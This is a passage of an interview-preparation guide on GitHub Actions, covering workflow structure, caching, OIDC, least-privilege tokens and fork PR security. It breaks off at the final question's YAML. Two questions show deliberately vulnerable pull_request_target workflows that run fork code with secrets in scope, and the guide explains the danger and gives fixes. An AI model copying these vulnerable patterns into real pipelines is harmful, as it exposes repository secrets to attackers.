- **`GITHUB_TOKEN`** — a short-lived token auto-injected per run for authenticating to the GitHub API; scoped by `permissions:`.
- **Secret** — an encrypted value (`${{ secrets.X }}`) set at repo/org/environment level, masked in logs.
- **Artifact** — a file bundle uploaded from a run to persist beyond the ephemeral runner or share between jobs.
- **Cache** — restorable key-scoped storage (`actions/cache`) to reuse dependencies across runs and speed up builds.

**Why interviewers ask this**

GitHub Actions questions are a fast read on whether a candidate actually ships. A junior answer describes YAML syntax and lists triggers. A senior answer reasons about the **execution model and its consequences**: they know jobs are parallel and stateless, so they know why they need `needs:` and artifacts; they know the runner is ephemeral, so they cache dependencies rather than expecting them to persist; they know `GITHUB_TOKEN` is powerful, so they scope `permissions:` down. The single sharpest signal is **security awareness around third-party actions** — a candidate who says "pin actions by commit SHA, not by tag, because a tag can be moved to point at malicious code" has clearly operated a real pipeline and thought about supply-chain risk. Interviewers also probe whether you can go from a blank repo to a working build-and-test workflow, because that is the day-one task on most teams.

**Common confusions**

- "Jobs run in order top to bottom" — no, jobs run **in parallel** by default; you must use `needs:` to order them.
- "The runner keeps my code between runs" — no, every job gets a **clean VM**; you must run `actions/checkout` and re-install dependencies (or restore a cache) each time.
- "`uses:` and `run:` are interchangeable" — `uses:` invokes a packaged action; `run:` executes shell. Different mechanisms.
- "Steps in different jobs share files" — no, only steps **within the same job** share a filesystem; cross-job data needs artifacts or `outputs`.
- "Pinning `@v4` is safe" — a tag is mutable and can be repointed by an attacker who compromises the action; pin by **commit SHA** for third-party actions.
- "`GITHUB_TOKEN` has full access" — its scope is configurable via `permissions:`; default to least privilege.

**What follows from this topic**

Everything in **GitHub Actions in Depth** builds directly on these primitives: matrix builds are just a job strategy, reusable workflows are `workflow_call` events, environments add approval gates to deployment jobs, and OIDC replaces long-lived secrets with a short-lived token requested via the same context system. The parallel-jobs-and-`needs:` model is the foundation for the deployment-pipeline topics (build once, promote the same artifact). And the "pin by SHA / scope the token" instinct introduced here is the seed of the supply-chain and `pull_request_target` security discussions later. If the fundamentals here feel shaky, the in-depth material will feel like memorising incantations rather than composing tools you understand.

### Q1. What is a GitHub Actions workflow, and how is it structured?

A **workflow** is a YAML file in `.github/workflows/` that GitHub runs automatically in response to events. The hierarchy is **workflow → jobs → steps**:

- A workflow declares **when** it runs (`on:`) and **what** it does (one or more jobs).
- A **job** runs on a single runner and contains an ordered list of steps.
- A **step** is either a `run:` shell command or a `uses:` reference to an action.

```yaml
name: CI
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: echo "Building on ${{ github.sha }}"
```

Key mental model: **jobs run in parallel** unless connected with `needs:`, and **steps run sequentially** within a job, sharing the same filesystem and environment.

### Q2. What events can trigger a workflow? Walk through the `on:` triggers.

The `on:` block declares one or more events:

- **`push`** — commits pushed to a branch or tag (filter with `branches:`, `tags:`, `paths:`).
- **`pull_request`** — a PR is opened, synchronised, or reopened; the workhorse for CI on proposed changes.
- **`workflow_dispatch`** — manual trigger from the UI or API, optionally with typed `inputs:`.
- **`schedule`** — cron expressions for periodic runs (nightly builds, dependency scans).
- **`release`** — a GitHub Release is published/created; common for publish-on-release pipelines.
- **`workflow_call`** — makes the workflow reusable, callable from another workflow.
- **`repository_dispatch`** — triggered by an external system via the API (custom event types).

```yaml
on:
  push:
    branches: [main]
    tags: ['v*']
  pull_request:
  workflow_dispatch:
    inputs:
      environment:
        type: choice
        options: [staging, production]
  schedule:
    - cron: '0 2 * * *'   # 02:00 UTC nightly
```

### Q3. Explain the difference between jobs and steps, and how they execute.

A **job** is a unit of work that runs on its own runner. A **step** is one action or command inside a job.

| | Jobs | Steps |
|---|---|---|
| Runs on | Its own runner (fresh VM) | Inside a job, same VM |
| Concurrency | Parallel by default | Sequential |
| Ordering | `needs:` | Order in the list |
| Shares filesystem | No (isolated VMs) | Yes (within the job) |
| Data passing | `outputs` + artifacts | `$GITHUB_OUTPUT`, env, files |

Because jobs are isolated VMs, two jobs cannot see each other's files. To pass work along, either combine steps into one job (shared filesystem) or use `outputs`/artifacts to hand data across the `needs:` boundary.

### Q4. What is a runner? Compare GitHub-hosted and self-hosted runners.

A **runner** is the machine that executes a job. GitHub schedules the job onto a runner, runs its steps, and reports results back.

**GitHub-hosted runners** — GitHub provisions a **fresh, clean virtual machine** for every job (`ubuntu-latest`, `windows-latest`, `macos-latest`), pre-loaded with common tools, then destroys it. Ephemeral by design: no state leaks between runs, nothing to patch, but you pay per-minute and can't reach private network resources.

**Self-hosted runners** — machines you own and register (on-prem, in your VPC, or on a bare-metal Mac for iOS builds). You get custom hardware, private network access, and persistent caches, but you own security, patching, and isolation. Critical caveat: **never use self-hosted runners on public repos for untrusted PRs** — fork code could run on your infrastructure.

```yaml
jobs:
  build:
    runs-on: ubuntu-latest        # GitHub-hosted
  deploy:
    runs-on: [self-hosted, linux, x64]   # labels select your runner
```

### Q5. What's the difference between `uses:` and `run:` in a step?

**`run:`** executes shell commands directly on the runner:

```yaml
- run: |
    npm ci
    npm test
```

**`uses:`** invokes a packaged **action** — reusable code published to the marketplace or living in a repo:

```yaml
- uses: actions/checkout@v4
- uses: actions/setup-node@v4
  with:
    node-version: 20
```

Use `run:` for one-off commands specific to your project; use `uses:` for reusable, parameterised logic (checkout, language setup, caching, deploying). Inputs to an action go under `with:`.

### Q6. What are the three types of actions?

- **JavaScript actions** — run directly on the runner via Node; fastest startup, cross-platform, the most common type for tooling.
- **Docker container actions** — run inside a container you define; total control over the environment and dependencies, but Linux-only and slower to start (image pull/build).
- **Composite actions** — bundle **multiple steps** (a mix of `run:` and `uses:`) into a single reusable action defined in an `action.yml`. The lightweight way to DRY up repeated step sequences without publishing a full action.

Pick JavaScript for portability and speed, Docker when you need a specific runtime/toolchain, composite to package a sequence of steps you repeat across workflows.

### Q7. Explain contexts and expressions. Give examples.

**Contexts** are structured objects holding run data; **expressions** (`${{ ... }}`) read them and compute values.

Common contexts:
- `github` — event and repo data: `github.sha`, `github.ref`, `github.actor`, `github.event.*`.
- `env` — environment variables.
- `secrets` — encrypted secrets: `secrets.NPM_TOKEN`.
- `steps` — outputs of earlier steps: `steps.build.outputs.version`.
- `needs` — outputs of upstream jobs: `needs.build.outputs.version`.
- `job` / `runner` / `matrix` — job status, runner OS, matrix values.

```yaml
- name: Deploy only on main
  if: ${{ github.ref == 'refs/heads/main' && github.event_name == 'push' }}
  run: ./deploy.sh
- run: echo "PR #${{ github.event.pull_request.number }}"
```

`if:` conditionals evaluate expressions to decide whether a step or job runs — the primary control-flow mechanism.

### Q8. How do you pass data between jobs?

Because jobs are isolated VMs, you use **`outputs`** for small values and **artifacts** for files, wired across a `needs:` dependency.

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    outputs:
      version: ${{ steps.meta.outputs.version }}
    steps:
      - id: meta
        run: echo "version=1.4.2" >> "$GITHUB_OUTPUT"
      - run: npm run build
      - uses: actions/upload-artifact@v4
        with:
          name: dist
          path: dist/
  deploy:
    needs: build
    runs-on: ubuntu-latest
    steps:
      - run: echo "Deploying ${{ needs.build.outputs.version }}"
      - uses: actions/download-artifact@v4
        with:
          name: dist
```

`needs: build` both **orders** the jobs (deploy waits for build) and **exposes** build's outputs. This is the "build once, promote the same artifact" pattern in miniature.

### Q9. What is the `GITHUB_TOKEN` and how should you scope its permissions?

`GITHUB_TOKEN` is a **short-lived token GitHub auto-generates for each run**, letting steps authenticate to the GitHub API (comment on PRs, push tags, publish to GHCR) without you managing a personal access token. It expires when the job finishes.

By default it can be broad. Best practice is **least privilege** via `permissions:` — start at `read-all` (or none) and grant only what a job needs:

```yaml
permissions:
  contents: read          # default for all jobs
jobs:
  release:
    permissions:
      contents: write      # this job may push tags/releases
      packages: write      # and publish to GHCR
```

Scoping the token down limits the blast radius if a step (or a compromised action) misbehaves.

### Q10. How do you handle environment variables and secrets?

**Environment variables** set non-sensitive config, scoped at workflow, job, or step level via `env:`:

```yaml
env:
  NODE_ENV: production
jobs:
  test:
    env:
      LOG_LEVEL: debug
    steps:
      - run: echo "$NODE_ENV / $LOG_LEVEL"
```

**Secrets** hold sensitive values, stored encrypted at **repo, organisation, or environment** scope, and referenced via `${{ secrets.X }}`. GitHub **masks** them in logs automatically:

```yaml
- run: npm publish
  env:
    NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}
```

Never `echo` a secret or bake it into an artifact. Environment-scoped secrets (tied to a deployment environment) are the safest for prod credentials because they can require approval before they're accessible.

### Q11. What do setup actions like `actions/checkout` and `actions/setup-node` do?

Because the runner starts as a **clean VM with none of your code**, you bootstrap it every run:

- **`actions/checkout`** — clones your repository onto the runner. Without it, there's nothing to build. Configure fetch depth, submodules, or a different ref as needed.
- **`actions/setup-node`** (and `setup-python`, `setup-java`, `setup-go`…) — installs a specific language runtime version and wires up dependency caching.

```yaml
steps:
  - uses: actions/checkout@v4
  - uses: actions/setup-node@v4
    with:
      node-version: 20
      cache: npm          # caches ~/.npm keyed on lockfile
  - run: npm ci
```

These two are the near-universal opening steps of almost every CI job.

### Q12. Write a minimal build-and-test workflow for a Node project.

```yaml
name: CI
on:
  push:
    branches: [main]
  pull_request:

permissions:
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 20
          cache: npm
      - run: npm ci
      - run: npm run lint
      - run: npm test
      - run: npm run build
```

This runs on every push to `main` and every PR: checks out code, installs a pinned Node with dependency caching, installs deps deterministically with `npm ci`, then lints, tests, and builds. It's the honest 80% of what most teams need on day one.

### Q13. How does caching work in GitHub Actions?

Caching stores directories (dependency folders, build outputs) keyed by a hash so subsequent runs restore them instead of rebuilding from scratch.

```yaml
- uses: actions/cache@v4
  with:
    path: ~/.npm
    key: npm-${{ hashFiles('package-lock.json') }}
    restore-keys: |
      npm-
```

- **`key`** — exact cache identity; typically a hash of the lockfile so it invalidates when dependencies change.
- **`restore-keys`** — fallback prefixes for a partial (near-)hit when the exact key misses.

Many `setup-*` actions expose a `cache:` shortcut that wires this up for you. Caching cuts minutes off dependency installs — but remember it's a **speed optimisation, not persistence**: a cache can be evicted, so builds must still work on a cold cache.

### Q14. What do `defaults` and `working-directory` control?

**`defaults`** sets default settings for `run:` steps — most often the shell and working directory — so you don't repeat them:

```yaml
defaults:
  run:
    shell: bash
    working-directory: ./service
```

**`working-directory`** sets the directory a `run:` step executes in. Set it per-step or via `defaults`. This matters a lot in **monorepos**, where each job operates inside a specific package directory:

```yaml
- run: npm ci
  working-directory: packages/api
```

Without it, commands run from the repo root, which breaks tooling that expects to sit next to a `package.json`.

### Q15. What are status checks and the Checks API?

**Status checks** are the pass/fail results a workflow reports back to a commit or PR. GitHub surfaces them on the PR, and **branch protection rules** can make specific checks **required** — the PR can't merge until they're green.

The **Checks API** is the richer interface actions use to report results: named check runs, annotations pinned to specific lines (e.g. a linter flagging line 42), and detailed summaries. A failing test job becomes a red required check that blocks the merge; a linter can annotate the exact offending lines inline. This is how CI enforces "keep main green" — the gate is mechanical, not a matter of reviewer discipline.

### Q16. What is `concurrency` and why would you use it?

`concurrency` prevents overlapping runs of the same workflow by grouping them and optionally cancelling the older run:

```yaml
concurrency:
  group: ci-${{ github.ref }}
  cancel-in-progress: true
```

Common uses: when someone pushes twice quickly to a PR, cancel the now-stale first run instead of wasting minutes on outdated code; and for **deploys**, serialise so two deployments to the same environment never race. For CI you usually want `cancel-in-progress: true` (latest commit wins); for production deploys you often want it `false` (let the in-flight deploy finish rather than abort mid-way).

### Q17. Why must you pin third-party actions by commit SHA?

Because a **tag or branch reference is mutable**. When you write `uses: some-org/action@v3`, you're trusting that `v3` still points at the code you reviewed. If that action's repo is compromised — or the maintainer turns malicious — an attacker can **move the `v3` tag to point at new, malicious code**, and your next run executes it with your secrets and `GITHUB_TOKEN`. This is a live supply-chain attack class.

Pinning by **full commit SHA** freezes the exact code:

```yaml
# Mutable — a moved tag silently changes what runs:
- uses: some-org/action@v3
# Immutable — this exact commit, forever:
- uses: some-org/action@a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0
```

First-party actions (`actions/checkout`) are lower risk but the same principle applies for the strictest posture. Use Dependabot to bump the pinned SHAs so you still get updates — reviewed, not silently swapped. The one-line rule: **pin by SHA, update deliberately.**

## GitHub Actions in Depth

### Summary

**What this topic covers**

This topic goes past "write a workflow that builds and tests" into the features that make GitHub Actions scale across many versions, many repos, and real production deploys — and the security footguns that come with them. It covers **matrix builds** (fan a job across versions/OSes), **reusable workflows** vs **composite actions** (two different ways to DRY, with different trade-offs), **caching** and **artifacts** in depth (and why they're not the same tool), **deployment environments** with required reviewers (the manual approval gate for prod), **concurrency** groups for safe deploys, **OIDC** to cloud providers (short-lived tokens instead of long-lived AWS keys — the single biggest CI security upgrade), least-privilege `permissions:`, and the **`pull_request` vs `pull_request_target`** danger that leaks secrets to forked PRs if you get it wrong. The 17 questions run from "how does a matrix work" to "this workflow lets a fork exfiltrate our secrets — fix it." Assume the fundamentals from the previous topic; here we compose them into production-grade pipelines and pick apart how they get attacked.

**Mental model**

Two lenses. The first is **composition**: at scale you stop writing one long workflow and start assembling small reusable pieces — a matrix expands one job into N, a reusable workflow lets ten repos share one pipeline, a composite action packages a step sequence, environments and concurrency wrap deploy jobs in gates and locks. The second lens, and the one that separates senior engineers, is **trust boundaries**. Every workflow runs *something* with *some* privileges triggered by *some* actor — and the security of the whole system is about keeping untrusted input (fork PRs, third-party actions) away from high privilege (secrets, `contents: write`, a cloud role). OIDC exists to shrink the standing privilege (no long-lived keys to steal). `permissions:` exists to shrink the token's blast radius. `pull_request_target` is dangerous precisely because it *inverts* the usual boundary — it grants secrets to a context evaluating untrusted fork code. If you hold "compose small pieces, guard trust boundaries" in your head, the rest is detail.

**Key terms**

- **Matrix** — `strategy.matrix` expands one job definition into many parallel jobs across parameter combinations.
- **Reusable workflow** — a workflow called from another via `workflow_call`, with typed `inputs`, `secrets`, and `outputs`.
- **Composite action** — an action (`action.yml`) that bundles multiple steps into one reusable `uses:` unit.
- **Artifact** — a file bundle persisted from a run for download or cross-job sharing; retention-limited, purpose = output.
- **Cache** — key-scoped restorable storage for dependencies/build state; purpose = speed, may be evicted.
- **Environment** — a named deployment target (`production`) with protection rules: required reviewers, wait timers, branch policies, scoped secrets.
- **Concurrency group** — a lock that serialises or cancels overlapping runs sharing a key.
- **OIDC** — OpenID Connect: the workflow requests a short-lived signed token and exchanges it for a cloud IAM role, eliminating stored cloud keys.
- **`permissions:`** — least-privilege scoping of `GITHUB_TOKEN`.
- **`pull_request_target`** — trigger that runs in the **base repo context with secrets** against PR code; a poisoned-pipeline risk on forks.
- **`fail-fast`** — matrix setting: cancel all matrix jobs when one fails (default true).
- **Job summary** — markdown a job writes to `$GITHUB_STEP_SUMMARY` to render a rich report on the run page.

**Why interviewers ask this**

This topic is where interviewers find out whether you've **operated** CI/CD at scale or just configured it. Matrix and reusable-workflow questions probe whether you've felt the pain of duplication across repos. But the questions that matter most are the **security** ones, because a misconfigured pipeline is a genuine breach vector. Asking "how do you deploy to AWS from Actions without storing keys" separates candidates who reach for OIDC from candidates who paste an access key into a secret. Asking about `pull_request_target` is almost a trick question — the wrong answer ("use it so PRs can access secrets") is exactly the vulnerability. A senior candidate treats the CI system as **production infrastructure with a real attack surface**: least-privilege tokens, short-lived cloud creds, untrusted fork code quarantined from secrets, third-party actions pinned. That posture is the signal.

**Common confusions**

- "Artifacts and caches are the same" — no. **Artifacts** are outputs you want to keep/share; **caches** are a speed optimisation that may vanish. Never rely on a cache for correctness.
- "Reusable workflows and composite actions are interchangeable" — reusable workflows call **whole jobs** (own runners, `needs`, environments); composite actions bundle **steps** inside one job.
- "OIDC is just another secret" — the opposite: OIDC means **no stored cloud credential**; the token is minted per-run and expires in minutes.
- "`pull_request_target` is a safer `pull_request`" — it's the dangerous one; it runs with secrets in the base context against fork code.
- "`permissions:` is optional boilerplate" — it's the primary blast-radius control for `GITHUB_TOKEN`.
- "Environment approvals slow me down for no reason" — they are the auditable human gate for continuous **delivery** to prod.

**What follows from this topic**

The security spine here — OIDC, least-privilege tokens, quarantining untrusted code — is the same spine as the supply-chain topics (SLSA, provenance, signing) and the deployment-strategy topics (who is allowed to flip traffic to a new version). Environments and concurrency are the direct building blocks of blue-green and canary deploys with approval gates. Reusable workflows are how a platform team standardises pipelines across an org — the CI half of "golden paths." And the OIDC pattern (short-lived, per-workload identity instead of standing secrets) is the same idea you'll meet again in GitOps and cloud IAM. Master the trust-boundary thinking here and the rest of CD security is application, not new theory.

### Q1. What are matrix builds and when do you use them?

A **matrix** expands a single job definition into many parallel jobs, one per combination of parameters — the standard way to test across multiple language versions and operating systems without copy-pasting jobs.

```yaml
jobs:
  test:
    strategy:
      fail-fast: false
      max-parallel: 4
      matrix:
        node: [18, 20, 22]
        os: [ubuntu-latest, windows-latest]
        include:
          - node: 20
            os: ubuntu-latest
            coverage: true      # add a field to one combo
        exclude:
          - node: 18
            os: windows-latest  # drop a combo
    runs-on: ${{ matrix.os }}
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: ${{ matrix.node }}
      - run: npm ci && npm test
```

- **`include`** adds extra combinations or extra fields to existing ones.
- **`exclude`** removes specific combinations.
- **`fail-fast: false`** lets every combo finish even if one fails (you want the full failure picture); default `true` cancels siblings on first failure.
- **`max-parallel`** caps concurrent matrix jobs to control runner usage.

### Q2. Reusable workflows vs composite actions — what's the difference and when do you use each?

Both DRY up repetition, but at **different levels**.

| | Reusable workflow | Composite action |
|---|---|---|
| Unit reused | Whole **jobs** | A sequence of **steps** |
| Invoked by | `jobs.x.uses:` | `steps: - uses:` |
| Runs on | Its own runner(s) | The caller's runner |
| Can use `needs`, `environment`, matrix | Yes | No |
| Inputs/secrets | `workflow_call` inputs + secrets | `inputs` only |
| Best for | Standardising a **pipeline** across repos | Packaging a repeated **step block** |

**Reusable workflow** — extract an entire build/test/deploy pipeline so many repos share it:

```yaml
# caller
jobs:
  ci:
    uses: acme/.github/.github/workflows/node-ci.yml@v1
    with:
      node-version: 20
    secrets:
      NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
```

**Composite action** — bundle "checkout + setup + install + cache" into one `uses:` you drop into any job. Rule of thumb: reusing **steps within a job** → composite action; standardising **whole jobs/pipelines** → reusable workflow.

### Q3. Explain caching in depth — keys, restore-keys, and the common gotchas.

`actions/cache` restores a directory keyed by a hash. The mechanics:

```yaml
- uses: actions/cache@v4
  with:
    path: |
      ~/.npm
      node_modules
    key: ${{ runner.os }}-npm-${{ hashFiles('package-lock.json') }}
    restore-keys: |
      ${{ runner.os }}-npm-
```

- **Cache hit** — exact `key` match: the directory is restored, and (with the default action) **not re-saved** at job end.
- **Cache miss with partial restore** — no exact match but a `restore-keys` prefix matches: you get the closest older cache, then the action **saves a new cache** under the exact `key` at the end.
- **Total miss** — nothing restored; a fresh cache is saved.

Gotchas: (1) **scope** — caches are scoped to a branch; a branch can read caches from its base branch and `main`, but sibling branches can't share, so first runs on a new branch may miss. (2) Include the lockfile hash in the key or you serve **stale dependencies**. (3) Never depend on a cache for correctness — it can be **evicted** (size limits, 7-day inactivity); the build must survive a cold cache.

### Q4. What are artifacts, and how do they differ from caches?

**Artifacts** persist files produced by a run — build outputs, test reports, compiled binaries, coverage — for download from the run page or for handing between jobs.

```yaml
- uses: actions/upload-artifact@v4
  with:
    name: dist
    path: dist/
    retention-days: 7
# ...in a downstream job:
- uses: actions/download-artifact@v4
  with:
    name: dist
```

Artifacts vs caches — **different purposes**, and conflating them is a classic mistake:

| | Artifact | Cache |
|---|---|---|
| Purpose | Preserve/share **outputs** | Speed up via **reuse** |
| Guaranteed present | Yes (until retention expires) | No (may be evicted) |
| Typical content | Binaries, reports, `dist/` | `node_modules`, `~/.m2` |
| Correctness depends on it | Can | Must **not** |

Use an artifact to move a built binary from `build` to `deploy` (build once, promote it). Use a cache to avoid re-downloading dependencies. If losing the data would break the run, it's an artifact, not a cache.

### Q5. What are deployment environments and how do required reviewers work?

An **environment** is a named deployment target (`staging`, `production`) with **protection rules** attached — the mechanism that turns Continuous Delivery into a gated, auditable deploy.

```yaml
jobs:
  deploy-prod:
    runs-on: ubuntu-latest
    environment:
      name: production
      url: https://app.acme.com
    steps:
      - run: ./deploy.sh
```

In the environment settings you configure:
- **Required reviewers** — named people/teams must click **Approve** before the job runs. This is the manual gate for prod: the pipeline pauses, waits for a human, and records who approved.
- **Wait timer** — a forced delay before deploy (bake time / last-chance window).
- **Deployment branch policy** — only allow deploys from `main` or release branches.
- **Environment secrets** — credentials scoped to this environment, accessible only after the gate passes.

The result: everyone can merge to main (green = releasable), but shipping to prod requires an approval that's logged for audit.

### Q6. What is concurrency, and how does it protect deploys?

A **concurrency group** serialises or cancels runs that share a key, preventing overlapping executions.

```yaml
# CI: newest commit wins, cancel stale runs
concurrency:
  group: ci-${{ github.ref }}
  cancel-in-progress: true
```

```yaml
# Deploy: never let two prod deploys overlap
concurrency:
  group: deploy-production
  cancel-in-progress: false
```

For CI, `cancel-in-progress: true` saves minutes by killing runs on superseded commits. For **deploys**, the key insight is safety: two deployments to the same environment racing can leave it in an inconsistent state. A single group like `deploy-production` with `cancel-in-progress: false` forces them to **queue** — the in-flight deploy completes, then the next begins. It also collapses duplicate triggers into a single effective run.

### Q7. How do you authenticate to a cloud provider without long-lived secrets? Explain OIDC.

Store **no** long-lived cloud keys. Instead use **OIDC (OpenID Connect)**: the workflow asks GitHub for a short-lived, signed identity token describing the run (repo, branch, environment), and the cloud provider — configured to **trust GitHub's OIDC issuer** — exchanges it for temporary role credentials that expire in minutes.

```yaml
permissions:
  id-token: write     # REQUIRED to request the OIDC token
  contents: read
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/gha-deploy
          aws-region: eu-west-1
      - run: aws s3 sync ./dist s3://acme-app
```

On the cloud side you create an IAM role whose trust policy allows GitHub's OIDC provider and **conditions on the subject claim** (e.g. only `repo:acme/app:ref:refs/heads/main`). Why this is the big security best practice: there is **no static AWS key to leak** from a secret or a log; credentials are minted per-run, short-lived, and scoped to exactly the workflow that should have them. Rotating keys becomes a non-problem because there are no keys.

### Q8. What does least-privilege `permissions:` achieve for `GITHUB_TOKEN`?

`permissions:` scopes what the auto-injected `GITHUB_TOKEN` can do. Default it to minimal and grant up only where needed:

```yaml
permissions:
  contents: read           # workflow-wide floor
jobs:
  publish:
    permissions:
      contents: read
      packages: write        # only this job publishes to GHCR
      id-token: write        # and requests OIDC
```

Why it matters: the token is available to **every step, including third-party actions**. If a compromised action runs with `contents: write` and `packages: write`, it can rewrite your repo and poison your registry. Setting a read-only floor and elevating per-job on a need-to-do basis shrinks the blast radius of any single misbehaving step to the minimum. Treat it as mandatory, not boilerplate.

### Q9. Explain the difference and danger between `pull_request` and `pull_request_target`.

This is the sharpest security distinction in GitHub Actions.

- **`pull_request`** — for PRs from forks, the workflow runs against the **PR's code** with a **read-only token and no secrets**. Safe by design: untrusted fork code can't touch your credentials.
- **`pull_request_target`** — runs in the context of the **base repository**, with **write token and full access to secrets**, but is still triggered by the fork's PR. If you then check out and execute the PR's code, you've handed **your secrets to code an attacker wrote** — a classic **poisoned pipeline / secret-exfiltration** vulnerability.

The dangerous pattern:

```yaml
# VULNERABLE
on: pull_request_target
jobs:
  build:
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # attacker's code
      - run: npm ci && npm run build   # runs with secrets in scope
```

A fork can add a malicious `postinstall` script that reads `secrets` / the token and exfiltrates it. Safe handling: use plain `pull_request` for anything that runs untrusted code; reserve `pull_request_target` only for tasks that **don't check out or execute PR code** (e.g. labelling a PR), keep `permissions:` minimal, and gate anything needing secrets behind a `workflow_run` on the trusted base or an environment approval after a maintainer reviews the diff.

### Q10. This workflow leaks secrets to forked PRs. What's wrong and how do you fix it?

```yaml
on: pull_request_target
permissions: write-all
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.ref }}
      - run: npm ci                     # runs fork's install scripts
        env:
          DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}
```

Three compounding faults: (1) **`pull_request_target`** grants the base context with secrets; (2) it **checks out and runs the fork's code** (`npm ci` executes arbitrary lifecycle scripts); (3) it exposes `secrets.DEPLOY_KEY` and uses `write-all`. A fork's `postinstall` can read `$DEPLOY_KEY` and POST it anywhere.

Fix — run untrusted code with **`pull_request`** (no secrets), least-privilege permissions, and no secrets in the CI path:

```yaml
on: pull_request
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 20
      - run: npm ci
      - run: npm test          # no secrets in scope; runs on fork code safely
```

If a downstream job genuinely needs secrets (e.g. publish a preview), trigger it via `workflow_run` after the untrusted job finishes, or require a maintainer approval through a protected environment so a human vets the diff before privileged steps run.

### Q11. How do you secure self-hosted runners, and how does autoscaling fit in?

Self-hosted runners run your jobs on **your** infrastructure, so the risks are physical/network, not just logical:

- **Never** attach self-hosted runners to **public repos** — a fork PR could execute attacker code on your box (with `pull_request` the code still runs, just without secrets).
- Prefer **ephemeral** runners: register, run one job, then destroy the machine — so nothing persists between jobs and a compromised job can't poison the next one.
- **Isolate** runners in a locked-down network segment with least-privilege access to internal systems; assume any job could be hostile.
- **Autoscaling** — controllers like **actions-runner-controller (ARC)** on Kubernetes spin ephemeral runner pods up on demand and tear them down after each job. You get elasticity (no idle fleet) plus the ephemeral-isolation security property for free.

The theme: treat the runner as a disposable, isolated, single-use execution sandbox.

### Q12. How do you scope a workflow to changed paths in a monorepo?

Use **`paths:`** (and `paths-ignore:`) filters so a workflow only runs when relevant files change — avoiding wasted runs on unrelated packages.

```yaml
on:
  pull_request:
    paths:
      - 'services/api/**'
      - 'packages/shared/**'
```

For finer control inside a job, `dorny/paths-filter` computes which areas changed and gates downstream jobs with `if:`:

```yaml
jobs:
  changes:
    outputs:
      api: ${{ steps.filter.outputs.api }}
    steps:
      - uses: dorny/paths-filter@v3
        id: filter
        with:
          filters: |
            api: services/api/**
  test-api:
    needs: changes
    if: ${{ needs.changes.outputs.api == 'true' }}
    runs-on: ubuntu-latest
    steps: [...]
```

This keeps monorepo CI fast — only the affected slices build and test — while still running everything when shared code changes.

### Q13. How do you automate releases with GitHub Actions?

Trigger on tags or published releases and gate publish steps to run only for those events:

```yaml
on:
  push:
    tags: ['v*.*.*']

permissions:
  contents: write     # create the GitHub Release
  packages: write     # publish artifacts

jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: 20, registry-url: 'https://registry.npmjs.org' }
      - run: npm ci && npm run build
      - run: npm publish --provenance
        env:
          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}
      - uses: softprops/action-gh-release@v2   # attach binaries, notes
```

Patterns worth knowing: derive the version from the tag (`github.ref_name`); `--provenance` publishes signed build provenance (supply-chain integrity); and for full automation, tools like **release-please** open a release PR that, when merged, tags and publishes — turning "release" into a merge.

### Q14. When do you reach for a reusable workflow vs a composite action? Give the decision.

Decide by **what you're reusing**:

- Reusing a **sequence of steps** that runs inside a caller's job (checkout + setup + cache + install) → **composite action**. It runs on the caller's runner, sees the caller's filesystem, and can't declare its own jobs or environments.
- Reusing an **entire pipeline** — multiple jobs, `needs` ordering, matrix, an `environment` gate — shared across repos → **reusable workflow**. It brings its own jobs and runners and is called with `jobs.x.uses:`.

Concretely: a platform team publishing "the standard Node CI+deploy pipeline" for 30 services uses a **reusable workflow** (with `workflow_call` inputs/secrets), so every repo's workflow is a few lines. A team that just repeats the same four setup steps in several jobs uses a **composite action**. If you need `environment:`, `needs:`, or matrix in the reused unit, it *must* be a reusable workflow — composites can't express those.

### Q15. How does secret masking work, and how can secrets still leak?

GitHub **automatically masks** registered secrets in logs — any exact occurrence of a secret's value is replaced with `***`. But masking is a safety net, not a guarantee, and secrets still leak when:

- The value is **transformed** before printing (base64-encoded, JSON-escaped, split across lines) — the masker doesn't recognise the altered string.
- A step **writes the secret to an artifact** or a file that's later uploaded.
- Untrusted code (a fork PR under `pull_request_target`, a malicious action) reads the secret from `env`/context and **exfiltrates** it to an external host — masking only affects *your* logs, not an attacker's server.

Defences: never `echo` secrets or pass them where they'll be logged; use `add-mask` for dynamically computed sensitive values; keep secrets out of the CI path for untrusted code (see `pull_request` vs `pull_request_target`); scope secrets to environments so they're only available after an approval gate; and prefer OIDC so there's no long-lived secret to leak at all.

### Q16. What are job summaries and deployment tracking, and why are they useful?

**Job summaries** let a step write Markdown to `$GITHUB_STEP_SUMMARY`, which renders as a rich report on the run page — far more legible than scrolling raw logs:

```yaml
- run: |
    echo "## Test Results" >> "$GITHUB_STEP_SUMMARY"
    echo "| Suite | Passed | Failed |" >> "$GITHUB_STEP_SUMMARY"
    echo "|---|---|---|" >> "$GITHUB_STEP_SUMMARY"
    echo "| unit | 142 | 0 |" >> "$GITHUB_STEP_SUMMARY"
```

**Deployment tracking** — when a job uses `environment:`, GitHub records a deployment against that environment via the Deployments API: you get a history of what shipped where and when, the current live version per environment, and links surfaced on the repo home. Together they make CI/CD **observable** — a reviewer sees a clean test summary and an auditor sees a full deploy timeline, without anyone parsing logs.

### Q17. Design a secure GitHub Actions pipeline that builds once and deploys to prod with an approval gate.

Requirements: build a single immutable artifact, run CI on it, deploy to staging automatically, then to prod behind a human gate, with no long-lived cloud keys.

```yaml
name: ci-cd
on:
  push:
